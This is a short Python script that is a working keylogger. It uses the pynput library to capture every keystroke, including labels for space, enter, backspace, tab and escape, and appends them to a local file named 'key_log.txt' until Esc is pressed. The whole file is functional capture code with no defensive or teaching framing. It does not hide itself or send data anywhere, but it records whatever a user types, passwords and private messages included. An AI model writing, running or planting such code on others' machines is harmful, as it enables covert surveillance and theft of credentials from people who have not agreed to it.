#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Jul 15 16:19:27 2024

@author: mahsa
"""

from pynput import keyboard

# The file where the logs will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                file.write("[TAB]")
            elif key == keyboard.Key.esc:
                file.write("[ESC]")
            else:
                file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
